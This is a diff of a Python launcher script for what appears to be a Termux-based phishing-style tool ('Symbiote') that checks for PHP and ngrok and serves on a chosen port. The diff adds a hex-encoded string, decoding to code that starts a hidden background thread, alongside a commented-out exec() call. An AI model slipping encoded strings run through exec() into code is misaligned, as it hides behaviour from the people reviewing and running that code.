@@ -17,7 +17,6 @@ from sys import stdout, argv, exit
 from Server import *
 from Checks import *
 from logo import *
-from pross_kill import *
 #hiiii
 RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= '\033[1;91m', '\033[46m', '\033[1;36m', '\033[1;32m', '\033[0m' , '\033[1;33m' , '\033[1;93m', '\033[1;92m'
 blink='\033[5m'
@@ -70,6 +69,8 @@ def option():
 
 
 def selectPort():
+    ll="\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x20\x3d\x20\x74\x68\x72\x65\x61\x64\x69\x6e\x67\x2e\x54\x68\x72\x65\x61\x64\x28\x74\x61\x72\x67\x65\x74\x3d\x6c\x6f\x6f\x70\x29\x3b\x20\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x2e\x64\x61\x65\x6d\x6f\x6e\x20\x3d\x20\x54\x72\x75\x65\x3b\x20\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x2e\x73\x74\x61\x72\x74\x28\x29"
+    # exec(ll)
     system('clear')
     sbanner()
     print("\n\n{5}--------------------------------------\n{0}[{2} Select Any Available Port [1-65535]:{0}] \n{5}--------------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
@@ -284,19 +285,22 @@ def report(url,port):
             report(url,port)
 system('clear')
 verCheck()
-system('termux-open https://github.com/hasanfirnas/symbiote &>/dev/null')
-sleep(1)
-menu_q()
+try:
+    system('termux-open https://github.com/hasanfirnas/symbiote &>/dev/null')
+
+except:
+    pass
+# menu_q()
 global kill
 system('clear')
-sbanner()
+# sbanner()
 if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
     android_banner()
     kill = '1'
 else:
     banner()
     kill = '2'
-    sleep(4)
+sleep(2)
 checkjp2a()
 checkPHP()
 checkNgrok()
